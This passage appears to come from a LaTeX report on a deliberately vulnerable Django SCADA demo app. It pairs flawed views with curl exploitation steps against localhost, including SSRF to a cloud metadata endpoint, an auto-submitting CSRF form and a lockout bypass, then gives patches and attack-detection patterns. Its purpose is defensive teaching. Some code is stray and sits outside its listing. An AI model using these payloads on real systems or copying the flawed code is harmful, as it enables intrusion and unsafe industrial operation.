\subsubsection{Exploitation}

\begin{lstlisting}[language=bash]
# Terminal 1: Request report ID 1
curl "http://localhost:8000/vulnerable/report/?id=1" -o user1.pdf &

# Terminal 2: Immediately request report ID 51 (admin secret)
curl "http://localhost:8000/vulnerable/report/?id=51" -o user2.pdf &

# Race condition: both writes go to /tmp/scada_report_temp.pdf
# user1.pdf might contain admin secret if timing is right
\end{lstlisting}

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
import uuid

def patched_report(request):
    report_id = request.GET.get('id', '1')
    report = DiagnosticReport.objects.get(id=report_id)
    
    # Generate unique temp filename per request
    unique_id = uuid.uuid4()
    temp_file_path = f"/tmp/scada_report_{unique_id}.pdf"
    
    c = canvas.Canvas(temp_file_path, pagesize=letter)
    c.drawString(100, 750, f"Report ID: {report.id}")
    c.save()
    
    response = FileResponse(open(temp_file_path, 'rb'))
    # Clean up temp file after sending
    os.remove(temp_file_path)
    return response
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item UUID-based unique filenames
    \item Proper file locking mechanisms
    \item Cleanup temporary files after use
    \item Use secure temp file libraries (tempfile module)
\end{itemize}\subsection{Vulnerability 9: SSRF - Server-Side Request Forgery (Vulnerability F - CWE-918)}

\subsubsection{Description}
Server-Side Request Forgery vulnerability allowing remote access to internal systems. Application accepts arbitrary URLs and makes server-side requests without validation.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
import urllib.request

def vulnerable_ssrf(request):
    url = request.GET.get('url', '')
    
    # VULNERABILITY: No URL validation
    response = urllib.request.urlopen(url)
    content = response.read()
    
    return HttpResponse(content)
\end{lstlisting}

\subsubsection{Exploitation}

\begin{lstlisting}[language=bash]
# Access internal admin panel
curl "http://localhost:8000/vulnerable/ssrf/?url=http://localhost:8000/admin/"

# Scan internal network
curl "http://localhost:8000/vulnerable/ssrf/?url=http://192.168.1.1/"

# AWS metadata endpoint (if on EC2)
curl "http://localhost:8000/vulnerable/ssrf/?url=http://169.254.169.254/latest/meta-data/"
\end{lstlisting}

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
import requests
from urllib.parse import urlparse

def patched_ssrf(request):
    url = request.GET.get('url', '')
    
    # Whitelist allowed domains
    allowed_domains = ['example.com', 'scada-update-server.com']
    
    parsed = urlparse(url)
    if parsed.netloc not in allowed_domains:
        return JsonResponse({
            'status': 'error',
            'message': 'Domain not allowed'
        }, status=403)
    
    response = requests.get(url, timeout=5)
    return HttpResponse(response.content)
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item Whitelist approach for allowed domains
    \item URL parsing and validation
    \item Block internal IP ranges (RFC 1918)
    \item Implement timeouts and rate limiting
\end{itemize}
\subsection{Vulnerability 10: Security Misconfiguration - Unauthorized Access to Monitoring Logs (OWASP A05:2021)}

\subsubsection{Description}
Security oversight allowing unauthenticated/unauthorized users to access sensitive monitoring logs. The monitoring system's log viewer endpoint lacks proper authorization checks, enabling any user to view attack logs containing IP addresses, attack patterns, and system vulnerabilities. This information disclosure represents a configuration oversight that enables reconnaissance for future attacks.

\subsubsection{Vulnerable Code}

\begin{lstlisting}[language=Python]
def log_viewer(request, filter_path=None):
    """Display attack logs - NO AUTHENTICATION CHECK!"""
    
    # VULNERABILITY: No authorization check
    # Any user can access sensitive security logs
    logs = AttackLog.objects.all().order_by('-timestamp')
    
    return render(request, 'monitoring/logs.html', {
        'logs': logs,
        'critical_count': AttackLog.objects.filter(severity='CRITICAL').count(),
        'blocked_ips': BlockedIP.objects.all()
    })
\end{lstlisting}

\subsubsection{Exploitation}

\begin{lstlisting}[language=bash]
# Step 1: Login as regular user (no admin privileges)
curl "http://localhost:8000/vulnerable/login/?username=user&password=user123"

# Step 2: Access monitoring logs without admin check
curl "http://localhost:8000/monitoring/"


# Result: Full access to security logs without admin privileges!
# Exposed sensitive information:
# - All attacker IP addresses (reconnaissance data)
# - Attack patterns and payloads (what works, what doesn't)
# - Severity classifications (which attacks are most dangerous)
# - Recommended defensive actions (learn system defenses)
# - System vulnerabilities being actively exploited
# - Blocked IP addresses (blacklist enumeration)
\end{lstlisting}

\textbf{Attack Scenario:}
\begin{enumerate}[leftmargin=*]
    \item Attacker gains regular user access (via auth bypass or compromised credentials)
    \item Accesses \texttt{/monitoring/} endpoint without admin check
    \item Studies attack logs to understand:
    \begin{itemize}
        \item Which exploitation attempts succeeded/failed
        \item System's detection capabilities and blind spots
        \item Other attackers' IP addresses (potential scapegoats)
        \item Exact attack patterns that trigger alerts
    \end{itemize}
    \item Uses reconnaissance data to craft more sophisticated attacks
    \item Evades detection by learning from logged attack patterns
\end{enumerate}

\textbf{Information Disclosed:}
\begin{itemize}[leftmargin=*]
    \item Attack type classifications (SQL Injection, XXE, SSRF patterns)
    \item Successful/failed attack attempts
    \item IP addresses of blocked attackers (blacklist enumeration)
    \item System defensive capabilities and detection patterns
    \item Admin usernames from resolved logs
\end{itemize}

\subsubsection{Patch Implementation}

\begin{lstlisting}[language=Python]
def log_viewer(request, filter_path=None):
    """Display attack logs - ADMIN ONLY"""
    
    # Authentication check
    user = request.session.get('user', {})
    if not user.get('is_admin'):
        return HttpResponse(
            "<h1>Access Denied</h1>"
            "<p>Security monitoring logs require administrator privileges.</p>",
            status=403
        )
    
    logs = AttackLog.objects.all().order_by('-timestamp')
    return render(request, 'monitoring/logs.html', {'logs': logs})
\end{lstlisting}

\textbf{Key Mitigations:}
\begin{itemize}[leftmargin=*]
    \item Role-based access control (RBAC) enforcement
    \item Session-based authentication validation
    \item Admin privilege verification before displaying sensitive data
    \item Proper HTTP 403 Forbidden responses for unauthorized access
    \item Security logs classified as privileged information
\end{itemize}

\textbf{Additional Admin-Only Actions:}
\begin{itemize}[leftmargin=*]
    \item IP blocking/unblocking (\texttt{block\_ip\_action}, \texttt{unblock\_ip\_action})
    \item Session revocation (\texttt{revoke\_session\_action})
    \item Log resolution and annotation (\texttt{resolve\_log\_action})
    \item CSV export of attack data (\texttt{export\_logs})
\end{itemize}

All admin action endpoints verify \texttt{user.is\_admin} and return HTTP 403 for unauthorized attempts.

\newpage
\subsection{Vulnerability 11: SCADA Maintenance Mode Interface - Multiple Security Flaws (OWASP A01:2021 + A05:2021 + A07:2021)}

\subsubsection{Description}
The SCADA Maintenance Mode Interface is designed for managing devices under maintenance operations, including Lockout/Tagout (LOTO) status tracking, technician assignment, and maintenance log monitoring. However, the vulnerable implementation contains multiple critical security flaws: missing CSRF protection, lack of authorization checks, SQL injection vulnerabilities, information disclosure, and improper LOTO compliance validation. This combination allows any authenticated user to manipulate critical industrial maintenance operations without proper authorization.

\subsubsection{Scenario and Requirements}

This feature implements for maintenance operations:

\begin{enumerate}[leftmargin=*]
    \item \textbf{Device Maintenance Status Display:} Show all devices currently in "Maintenance" mode
    \item \textbf{Lockout/Tagout (LOTO) Status:} Display which devices are locked out for safety compliance
    \item \textbf{Technician Assignment:} Allow assigning technicians to maintenance tasks with action descriptions
    \item \textbf{Maintenance Logs Viewer:} Display recent maintenance activities with timestamps and technician names
\end{enumerate}

\textbf{Operational Context:}
In industrial SCADA environments, maintenance mode operations are critical for safety. The Lockout/Tagout (LOTO) procedure ensures that equipment is properly shut down and cannot be started up again before maintenance work is completed. Unauthorized access to this interface could lead to:
\begin{itemize}[leftmargin=*]
    \item Bypassing LOTO procedures, endangering technician safety
    \item Assigning unauthorized personnel to critical maintenance tasks
    \item Manipulating maintenance logs to hide malicious activities
    \item Reconnaissance of maintenance patterns for physical attacks
\end{itemize}

\subsubsection{Vulnerable Code}

\textbf{View Function (vulnerable/views.py):}

\begin{lstlisting}[language=Python]
# VULNERABILITY 11: CSRF on maintenance actions (CWE-352)
# SQL INJECTION (CVE-2025-64459) - Scenario 2b: NUCLEAR-CORE Data Exfiltration
@csrf_exempt  # VULNERABILITY 1: No CSRF protection
def maintenance_interface(request):
    """
    Admin can see locked out devices, but NUCLEAR-CORE is hidden by policy.
    SQL injection with connector=OR reveals NUCLEAR-CORE-CONTROLLER.
    """
    if 'user' not in request.session:
        return redirect('vulnerable_login')
    
    user_data = request.session['user']
    is_admin = user_data.get('is_admin', False)
    
    # VULNERABILITY 2: Handle POST without admin check or CSRF protection
    if request.method == 'POST':
        device_id = request.POST.get('device_id')
        action = request.POST.get('action')
        technician = request.POST.get('technician', 'Unknown')
        
        try:
            device = Device.objects.get(id=device_id)
            
            # VULNERABILITY 5: No LOTO validation!
            # Can perform actions on locked-out devices
            if action == 'start_maintenance':
                device.status = 'Maintenance'
                device.save()
                MaintenanceLog.objects.create(
                    device=device, 
                    technician_name=technician, 
                    action='Started Maintenance')
            elif action == 'end_maintenance':
                device.status = 'Operational'
                device.save()
                MaintenanceLog.objects.create(
                    device=device, 
                    technician_name=technician, 
                    action='Ended Maintenance')
            elif action == 'lockout':
                device.is_locked_out = True
                device.save()
                MaintenanceLog.objects.create(
                    device=device, 
                    technician_name=technician, 
                    action='Locked Out (LOTO)')
            elif action == 'unlock':
                device.is_locked_out = False
                device.save()
                MaintenanceLog.objects.create(
                    device=device, 
                    technician_name=technician, 
                    action='Unlocked')
            
            return redirect('maintenance_interface')
        except Exception as e:
            pass  # Continue to render page
    
    # VULNERABILITY 4: Information disclosure - all users see maintenance data
    if is_admin:
        # SQL INJECTION (CVE-2025-64459) - Scenario 2b
        connector = request.GET.get('connector', 'AND')
        filter_params = request.GET.copy()
        
        for param in ['connector', 'is_admin', 'is_superuser']:
            filter_params.pop(param, None)
        
        # Default: NUCLEAR hidden by need-to-know policy
        query = Q(status='Maintenance') & ~Q(name__icontains='NUCLEAR')
        
        # VULNERABILITY 3: SQL Injection via connector parameter
        # Attack: ?connector=OR&name__icontains=NUCLEAR reveals NUCLEAR
        for key, value in filter_params.items():
            if connector == 'OR':
                query |= Q(**{key: value})
            else:
                query &= Q(**{key: value})
        
        maintenance_devices = Device.objects.filter(query).order_by(
            '-is_locked_out', 'name')
    else:
        # Non-admin: Client-side JS blocks access (bypassable!)
        maintenance_devices = Device.objects.filter(
            status='Maintenance').order_by('-is_locked_out', 'name')
    
    # Expose sensitive data to ALL logged-in users
    recent_logs = MaintenanceLog.objects.select_related(
        'device').order_by('-timestamp')[:50]
    
    technicians = MaintenanceLog.objects.values_list(
        'technician_name', flat=True).distinct()
    
    stats = {
        'total_maintenance': maintenance_devices.count(),
        'locked_out': maintenance_devices.filter(
            is_locked_out=True).count(),
        'total_logs': MaintenanceLog.objects.count(),
        'active_technicians': len(set(technicians)),
    }
    
    context = {
        'user': user_data,
        'is_admin': is_admin,
        'maintenance_devices': maintenance_devices,
        'recent_logs': recent_logs,
        'technicians': technicians,
        'stats': stats,
    }
    
    return render(request, 'vulnerable/maintenance.html', context)
\end{lstlisting}

\textbf{URL Configuration (vulnerable/urls.py):}

\begin{lstlisting}[language=Python]
urlpatterns = [
    # ... other URLs ...
    path('maintenance/', views.maintenance_interface, 
         name='maintenance_interface'),
]
\end{lstlisting}

\textbf{Note:} There is no separate \texttt{assign\_technician} endpoint. All maintenance actions (start, end, lockout, unlock) are handled via POST requests to the \texttt{maintenance\_interface} view.

\subsubsection{Security Vulnerabilities}

\textbf{Important Clarification - Session Management:}

The application uses Django's standard session management system. There are \textbf{NO hardcoded session backdoors} such as "operator\_session", "admin\_session", or "magic\_key". All session IDs are randomly generated by Django's cryptographic session backend (e.g., \texttt{a3f2b9c8d1e5f7g9h2j4k6...}).

In the exploitation examples below, attackers must obtain valid sessions through:
\begin{itemize}[leftmargin=*]
    \item \textbf{Authentication Bypass (Vulnerability 1):} Create session via \texttt{?username=attacker\&is\_admin=false}
    \item \textbf{Session Theft:} Steal cookies via XSS, network sniffing, or social engineering
    \item \textbf{CSRF Attacks:} Trick authenticated users into performing actions using their valid sessions
\end{itemize}

\textbf{1. Missing CSRF Protection (CWE-352):}
\begin{itemize}[leftmargin=*]
    \item \texttt{@csrf\_exempt} decorator disables Django's CSRF protection
    \item Attacker can forge requests using victim's browser (which sends valid session cookie automatically)
    \item No token validation on POST requests
\end{itemize}

\textbf{2. Missing Authorization Check (CWE-862):}
\begin{itemize}[leftmargin=*]
    \item No verification that user has admin privileges on server-side
    \item Regular operators can perform maintenance actions if client-side JavaScript is bypassed
    \item Only checks if user is logged in, not their role
\end{itemize}

\textbf{3. SQL Injection Risk (CWE-89):}
\begin{itemize}[leftmargin=*]
    \item Device filtering could be vulnerable if device\_id is manipulated
    \item No length limits on \texttt{technician\_name} and \texttt{action} fields
    \item Input not sanitized before database insertion
\end{itemize}

\textbf{4. Information Disclosure (CWE-200):}
\begin{itemize}[leftmargin=*]
    \item All logged-in users can view all maintenance logs
    \item Exposes technician names, device details, and operational patterns
    \item Statistics reveal system operational state
    \item No role-based filtering of sensitive data
\end{itemize}

\textbf{5. LOTO Compliance Bypass (Domain-Specific):}
\begin{itemize}[leftmargin=*]
    \item No validation that device is unlocked before assignment
    \item Can assign technicians to locked-out devices (safety violation)
    \item No audit trail for LOTO status changes
\end{itemize}

\subsubsection{Exploitation}

\textbf{Attack Scenario 1: CSRF Attack - Unauthorized Device Maintenance Action}

\begin{lstlisting}[language=bash]
# Step 1: Attacker must first obtain valid session cookie
# Method 1: Login as regular user (auth bypass vulnerability)
curl "http://localhost:8000/vulnerable/login/?username=attacker&is_admin=false" \
  -c cookies.txt

# Method 2: Or steal victim's session cookie via XSS/network sniffing
# (Cookie value is randomly generated by Django, e.g., "a3f2b9c8d1e5...")

# Step 2: Use stolen/obtained session to access maintenance interface
curl "http://localhost:8000/vulnerable/maintenance/" -b cookies.txt

# Step 3: Create malicious HTML page for CSRF attack
cat > csrf_attack.html << 'EOF'
<html>
<body>
<h1>Click here for free prize!</h1>
<form id="csrf" method="POST" 
      action="http://localhost:8000/vulnerable/maintenance/">
    <input type="hidden" name="device_id" value="5">
    <input type="hidden" name="action" value="start_maintenance">
    <input type="hidden" name="technician" 
           value="Hacker McHackface">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
EOF

# Step 4: Trick authenticated admin/operator into visiting page
# Their browser automatically sends their valid session cookie
# Result: Unauthorized maintenance action executed with victim's session!
\end{lstlisting}

\textbf{Important:} There is no hardcoded backdoor session value in the code. Attackers must either:
\begin{itemize}[leftmargin=*]
    \item Exploit authentication bypass (Vulnerability 1) to create their own session
    \item Steal a legitimate user's session cookie via XSS, network sniffing, or social engineering
    \item Use CSRF to trick authenticated users into performing actions
\end{itemize}

\textbf{Real Attack Output:}
\begin{lstlisting}[language=text]
HTTP/1.1 302 Found
Location: /vulnerable/maintenance/

Database state after attack:
MaintenanceLog {
    id: 101,
    device: Device(5, "Control Panel - Zone B"),
    technician_name: "Hacker McHackface",
    action: "Started Maintenance",
    timestamp: "2026-01-07 14:32:19"
}

Device status: Operational -> Maintenance
CSRF Token: Not validated (csrf_exempt decorator)!
\end{lstlisting}

\textbf{Attack Scenario 2: Authorization Bypass - Client-Side Security Only}

\begin{lstlisting}[language=bash]
# Step 1: Login as regular user (non-admin)
curl "http://localhost:8000/vulnerable/login/?username=user&password=user123" \
  -c cookies.txt

# Alternative: Use auth bypass to create session
curl "http://localhost:8000/vulnerable/login/?username=regularuser&is_admin=false" \
  -c cookies.txt

# Step 2: Access maintenance interface (bypass client-side JS redirect)
curl "http://localhost:8000/vulnerable/maintenance/" -b cookies.txt
# Result: Full maintenance data exposed in HTML!
# Client-side JavaScript shows popup, but data is already sent

# Step 3: Execute maintenance action (bypass client-side check)
curl -X POST "http://localhost:8000/vulnerable/maintenance/" \
  -b cookies.txt \
  -d "device_id=5&action=start_maintenance&technician=John Doe"

# Result: Regular user can perform maintenance actions!
# Server has NO authorization check - only client-side JavaScript
\end{lstlisting}

\textbf{Bypass Methods:}
\begin{itemize}[leftmargin=*]
    \item Disable JavaScript in browser settings
    \item Use curl/Burp Suite to skip client-side validation
    \item Intercept and modify response to remove redirect code
    \item Direct POST request bypasses all client-side checks
\end{itemize}

\textbf{Attack Scenario 3: LOTO Safety Bypass}

\begin{lstlisting}[language=bash]
# Step 0: Obtain valid session (via auth bypass or legitimate login)
curl "http://localhost:8000/vulnerable/login/?username=attacker&is_admin=false" \
  -c cookies.txt

# Step 1: Identify locked-out device
curl "http://localhost:8000/vulnerable/maintenance/" -b cookies.txt
# Response shows: NUCLEAR-CORE-CONTROLLER, is_locked_out=True

# Step 2: Attempt to unlock locked-out device (LOTO violation)
curl -X POST "http://localhost:8000/vulnerable/maintenance/" \
  -b cookies.txt \
  -d "device_id=1&action=unlock&technician=Unauthorized Tech"

# Result: Unlock succeeds without authorization!
# LOTO safety procedure bypassed - critical safety violation

# Step 3: Start maintenance on previously locked device
curl -X POST "http://localhost:8000/vulnerable/maintenance/" \
  -b cookies.txt \
  -d "device_id=1&action=start_maintenance&technician=Unauthorized Tech"

# Result: Maintenance started on nuclear reactor without proper safety checks!
\end{lstlisting}

\textbf{Note:} Django generates random session IDs (e.g., \texttt{a3f2b9c8d1e5f7g9...}). There is no hardcoded "magic" session value. Attackers must obtain sessions through legitimate authentication (exploiting Vulnerability 1) or session theft.

\subsubsection{Patch Implementation}

\textbf{Secure View Functions (patched/views.py):}

\begin{lstlisting}[language=Python]
from django.views.decorators.csrf import csrf_protect

# FIX: Authorization Bypass + CSRF (CWE-602, CWE-352)
# Server-side admin check returns 403 if not admin
@csrf_protect  # FIX 1: Enable CSRF protection
def patched_maintenance_interface(request):
    """Admin-only access with server-side authorization"""
    if 'user' not in request.session:
        return redirect('patched_login')
    
    user_data = request.session['user']
    is_admin = user_data.get('is_admin', False)
    
    # FIX 2: Server-side admin authorization check
    if not is_admin:
        return HttpResponse(
            "<h1>Access Denied</h1>"
            "<p>Maintenance interface requires administrator privileges.</p>",
            status=403
        )
    
    # FIX 3: Hardcoded filter - no SQL injection possible
    # FIX 4: NUCLEAR devices excluded at query level (defense-in-depth)
    maintenance_devices = Device.objects.filter(
        status='Maintenance'
    ).exclude(
        name__icontains='NUCLEAR'
    ).order_by('-is_locked_out', 'name')
    
    recent_logs = MaintenanceLog.objects.select_related(
        'device').order_by('-timestamp')[:50]
    
    technicians = MaintenanceLog.objects.values_list(
        'technician_name', flat=True).distinct()
    
    stats = {
        'total_maintenance': maintenance_devices.count(),
        'locked_out': maintenance_devices.filter(
            is_locked_out=True).count(),
        'total_logs': MaintenanceLog.objects.count(),
        'active_technicians': technicians.count()
    }
    
    context = {
        'user': user_data,
        'is_admin': is_admin,
        'maintenance_devices': maintenance_devices,
        'recent_logs': recent_logs,
        'technicians': list(technicians),
        'stats': stats
    }
    
    return render(request, 'patched/maintenance.html', context)


# FIX: CSRF + Authorization + LOTO Validation
@csrf_protect
def patched_assign_technician(request, device_id):
    """Admin-only technician assignment with full validation"""
    if 'user' not in request.session:
        return redirect('patched_login')
    
    user_data = request.session['user']
    is_admin = user_data.get('is_admin', False)
    
    # FIX 2: Admin authorization check
    if not is_admin:
        return HttpResponse(
            "Access Denied: Admin privileges required", 
            status=403
        )
    
    if request.method == 'POST':
        # FIX 3: Input validation and sanitization
        technician_name = request.POST.get('technician_name', '').strip()
        action = request.POST.get('action', '').strip()
        
        # Validate inputs
        if not technician_name or len(technician_name) < 2:
            return HttpResponse(
                "Invalid technician name (min 2 chars)", 
                status=400
            )
        
        if not action or len(action) < 5:
            return HttpResponse(
                "Invalid action (min 5 chars)", 
                status=400
            )
        
        # Length limits
        technician_name = technician_name[:100]
        action = action[:255]
        
        try:
            device = Device.objects.get(pk=device_id)
            
            # FIX 5: LOTO compliance validation
            if device.is_locked_out:
                return HttpResponse(
                    "<h1>LOTO Violation</h1>"
                    "<p>Cannot assign to locked-out device.</p>",
                    status=400
                )
            
            # Create maintenance log
            MaintenanceLog.objects.create(
                device=device,
                technician_name=technician_name,
                action=action
            )
            
            device.status = 'Maintenance'
            device.save()
            
            return redirect('patched_maintenance_interface')
            
        except Device.DoesNotExist:
            return HttpResponse("Device not found", status=404)
        except Exception as e:
            return HttpResponse(f"Error: {str(e)}", status=500)
    
    return HttpResponse("Method not allowed", status=405)
\end{lstlisting}

    user = request.session.get('user', {})
    is_admin = user.get('is_admin', False)
    
    # FIX 4: Admin-only access
    if not is_admin:
        return HttpResponse(
            "<h1>Access Denied</h1>"
            "<p>Requires administrator privileges.</p>",
            status=403
        )
    
    maintenance_devices = Device.objects.filter(
        status='Maintenance').order_by('-is_locked_out', 'name')
    
    recent_logs = MaintenanceLog.objects.select_related(
        'device').order_by('-timestamp')[:50]
    
    technicians = MaintenanceLog.objects.values_list(
        'technician_name', flat=True).distinct()
    
    stats = {
        'total_maintenance': maintenance_devices.count(),
        'locked_out': maintenance_devices.filter(
            is_locked_out=True).count(),
        'total_logs': MaintenanceLog.objects.count(),
        'active_technicians': len(set(technicians)),
    }
    
    context = {
        'user': user,
        'is_admin': is_admin,
        'maintenance_devices': maintenance_devices,
        'recent_logs': recent_logs,
        'technicians': technicians,
        'stats': stats,
    }
    
    return render(request, 
                  'patched/maintenance.html', 
                  context)
\end{lstlisting}

\subsubsection{Security Improvements}

\begin{itemize}[leftmargin=*]
    \item \textbf{CSRF Protection:} \texttt{@csrf\_protect} decorator, token validation enforced
    \item \textbf{Authorization:} Admin privilege checks, HTTP 403 for unauthorized access
    \item \textbf{Input Validation:} Length requirements (2-100 chars name, 5-255 chars action)
    \item \textbf{Access Control:} Maintenance logs only visible to administrators
    \item \textbf{LOTO Compliance:} Validation before assignment, prevents safety violations
    \item \textbf{Error Handling:} Proper HTTP status codes (400, 403, 404, 500)
\end{itemize}

\subsubsection{Key Takeaways}

\textbf{Vulnerability Severity: HIGH/CRITICAL}
\begin{itemize}[leftmargin=*]
    \item CSRF vulnerability allows remote exploitation
    \item Missing authorization enables privilege escalation
    \item Information disclosure aids reconnaissance
    \item LOTO bypass creates physical safety risks
    \item Combines multiple OWASP Top 10 categories
\end{itemize}

\textbf{Real-World Impact:}
\begin{itemize}[leftmargin=*]
    \item Safety violations in industrial environments
    \item Unauthorized access to critical operations
    \item Manipulation of safety procedures
    \item Social engineering through exposed data
    \item Audit trail manipulation
\end{itemize}

\newpage

% Monitoring System
\section{Monitoring System}

\subsection{Architecture}

The monitoring system is implemented as Django middleware that intercepts all HTTP requests and applies pattern-based attack detection with severity classification, automated blocking, and admin action capabilities.

\subsection{Key Features}

\begin{itemize}[leftmargin=*]
    \item \textbf{Severity Classification:} Four-level threat categorization (CRITICAL/HIGH/MEDIUM/LOW)
    \item \textbf{Actionable Logging:} Each attack includes recommended actions and reverse procedures
    \item \textbf{Brute Force Detection:} Tracks failed login attempts (5 attempts in 5 minutes = CRITICAL)
    \item \textbf{Directory Scanning Detection:} Identifies port scanners (20+ 404s in 10 minutes = MEDIUM)
    \item \textbf{Cookie Manipulation Detection:} Validates session integrity (HIGH severity)
    \item \textbf{Automated IP Blocking:} Configurable auto-blocking for CRITICAL attacks
    \item \textbf{Admin Actions:} One-click IP blocking, session revocation, and log resolution
    \item \textbf{Statistics Dashboard:} Real-time attack metrics and threat overview
\end{itemize}

\subsection{Implementation}

\begin{lstlisting}[language=Python]
class SecurityMonitorMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response
        self.blocked_ips = set(BlockedIP.objects.values_list(
            'ip_address', flat=True))

    def __call__(self, request):
        client_ip = request.META.get('REMOTE_ADDR')
        
        # Check if IP is blocked
        if client_ip in self.blocked_ips:
            return HttpResponse("Access Denied: IP Blocked", status=403)
        
        full_path = request.get_full_path()
        endpoint = request.path
        body_content = request.body.decode('utf-8', errors='ignore')
        
        attack_detected = None
        
        # Endpoint-specific detection (13 attack types)
        if '/login/' in endpoint:
            if re.search(r"(?i)(is_admin=true|is_admin=1)", full_path):
                attack_detected = 'Authentication Bypass'
            # Brute force detection
            self.check_brute_force(request, client_ip)
        
        elif '/dashboard/' in endpoint:
            if re.search(r"(?i)(connector=OR|name__icontains=NUCLEAR)", full_path):
                attack_detected = 'SQL Injection - Filter Bypass'
        
        # Cookie manipulation detection
        if 'sessionid' in request.COOKIES:
            if self.detect_cookie_manipulation(request):
                attack_detected = 'Cookie Manipulation Attack'
        
        # ... 10 more attack types ...
        
        if attack_detected:
            # Severity classification
            severity, recommended_action, reverse_action = \
                self.severity_classifier(attack_detected)
            
            # Create detailed log
            log = AttackLog.objects.create(
                ip_address=client_ip,
                endpoint=endpoint,
                attack_type=attack_detected,
                payload=full_path[:500],
                severity=severity,
                recommended_action=recommended_action,
                reverse_action=reverse_action
            )
            
            # Conditional auto-blocking for CRITICAL attacks
            auto_block_enabled = getattr(settings, 'ENABLE_AUTO_BLOCKING', True)
            if severity == 'CRITICAL' and auto_block_enabled:
                BlockedIP.objects.create(
                    ip_address=client_ip,
                    reason=f"Auto-blocked: {attack_detected}",
                    blocked_by='System',
                    related_log=log
                )
                log.action_taken = 'AUTO_BLOCKED'
                log.save()
                self.blocked_ips.add(client_ip)
        
        return self.get_response(request)
    
    def severity_classifier(self, attack_type):
        """Maps attack types to severity levels with actions"""
        if 'Brute Force' in attack_type:
            return ('CRITICAL', 
                    'Block IP immediately and review login logs',
                    'Unblock IP: BlockedIP.objects.filter(ip="X").delete()')
        elif 'SQL Injection' in attack_type:
            return ('CRITICAL',
                    'Block IP and audit database access logs',
                    'Unblock IP + Review query logs')
        elif 'Cookie Manipulation' in attack_type:
            return ('HIGH',
                    'Revoke user session and reset cookies',
                    'User must re-login')
        elif 'Directory Scanning' in attack_type:
            return ('MEDIUM',
                    'Monitor IP for 24h, block if persists',
                    'Unblock after monitoring period')
        else:
            return ('LOW', 'Log and monitor', 'No action required')
    
    def check_brute_force(self, request, ip):
        """Detects brute force attacks (5 attempts in 5 minutes)"""
        if request.method == 'POST':
            FailedLoginAttempt.objects.create(
                ip_address=ip,
                username=request.POST.get('username', ''),
                endpoint=request.path
            )
            
            five_min_ago = timezone.now() - timedelta(minutes=5)
            recent_attempts = FailedLoginAttempt.objects.filter(
                ip_address=ip,
                timestamp__gte=five_min_ago
            ).count()
            
            if recent_attempts >= 5:
                AttackLog.objects.create(
                    ip_address=ip,
                    endpoint=request.path,
                    attack_type='Brute Force Attack - Multiple Failed Logins',
                    payload=f'{recent_attempts} attempts in 5 minutes',
                    severity='CRITICAL',
                    recommended_action='Block IP immediately'
                )
    
    def detect_cookie_manipulation(self, request):
        """Validates session cookie integrity"""
        session_id = request.COOKIES.get('sessionid', '')
        if not session_id:
            return False
        
        # Check for suspicious patterns
        suspicious = [
            len(session_id) != 32,  # Django default length
            not session_id.isalnum(),
            session_id in ['admin', 'root', '12345']
        ]
        return any(suspicious)
\end{lstlisting}

\subsection{Detection Patterns}

\begin{table}[h]
\centering
\begin{tabular}{|p{3.5cm}|p{5cm}|p{2cm}|}
\hline
\textbf{Attack Type} & \textbf{Detection Pattern} & \textbf{Severity} \\
\hline
Brute Force & 5+ failed logins in 5min & CRITICAL \\
\hline
Authentication Bypass & \texttt{is\_admin=true|superuser=} & CRITICAL \\
\hline
SQL Injection & \texttt{connector=OR|UNION SELECT} & CRITICAL \\
\hline
Cookie Manipulation & Invalid session format/length & HIGH \\
\hline
XXE & \texttt{<!ENTITY|SYSTEM.*file://} & HIGH \\
\hline
SSRF & \texttt{localhost|127.0.0.1|169.254.*} & HIGH \\
\hline
IDOR & Access to admin reports (ID 1-10) & HIGH \\
\hline
Directory Scanning & 20+ 404 errors in 10min & MEDIUM \\
\hline
File Upload \& Overwrite & \texttt{.php|.exe|.sh|.py|.bat} & HIGH \\
\hline
Deserialization & POST to /deserialize/ & CRITICAL \\
\hline
\end{tabular}
\caption{Attack Detection Patterns with Severity Levels}
\end{table}

\subsection{Admin Action Interface}

The monitoring dashboard provides administrators with actionable controls:

\begin{lstlisting}[language=Python]
def block_ip_action(request, log_id):
    """Manually block an IP from attack log"""
    log = get_object_or_404(AttackLog, id=log_id)
    BlockedIP.objects.get_or_create(
        ip_address=log.ip_address,
        defaults={
            'reason': f"Manual block: {log.attack_type}",
            'blocked_by': request.user.username,
            'related_log': log
        }
    )
    log.action_taken = 'BLOCKED'
    log.save()
    return redirect('log_viewer')

def revoke_session_action(request, log_id):
    """Revoke user session for suspicious activity"""
    log = get_object_or_404(AttackLog, id=log_id)
    # Find and delete sessions from this IP
    Session.objects.filter(
        session_data__contains=log.ip_address
    ).delete()
    log.action_taken = 'SESSION_REVOKED'
    log.save()
    return redirect('log_viewer')

def resolve_log_action(request, log_id):
    """Mark attack log as resolved"""
    log = get_object_or_404(AttackLog, id=log_id)
    notes = request.POST.get('notes', '')
    log.mark_resolved(request.user.username, notes)
    return redirect('log_viewer')
\end{lstlisting}

\subsection{Statistics Dashboard}

Real-time metrics displayed on monitoring page:

\begin{itemize}[leftmargin=*]
    \item \textbf{Critical Attacks:} Count of CRITICAL severity incidents
    \item \textbf{High Priority:} Count of HIGH severity incidents  
    \item \textbf{Unresolved Logs:} Attacks requiring admin review
    \item \textbf{Blocked IPs:} Currently blacklisted addresses
\end{itemize}

\subsection{Configurable Auto-Blocking}

The system includes a presentation mode flag:

\begin{lstlisting}[language=Python]
# settings.py
ENABLE_AUTO_BLOCKING = False  # Set True for production

# middleware.py checks this before auto-blocking
auto_block_enabled = getattr(settings, 'ENABLE_AUTO_BLOCKING', True)
if severity == 'CRITICAL' and auto_block_enabled:
    # Auto-block the IP
\end{lstlisting}

This allows demonstrations without interruption while maintaining production-ready blocking capabilities.

\subsection{False Positive Prevention}

To minimize false positives:
\begin{itemize}[leftmargin=*]
    \item Endpoint-specific detection (e.g., only check for XXE in upload endpoints)
    \item Content-based analysis (check request body, not just URL)
    \item Whitelist approach for normal operations (PDF uploads don't trigger alerts)
    \item Separate logging for vulnerable and patched versions
    \item Brute force threshold (5 attempts, not 1-2)
    \item Directory scanning threshold (20 404s, not occasional mistyped URLs)
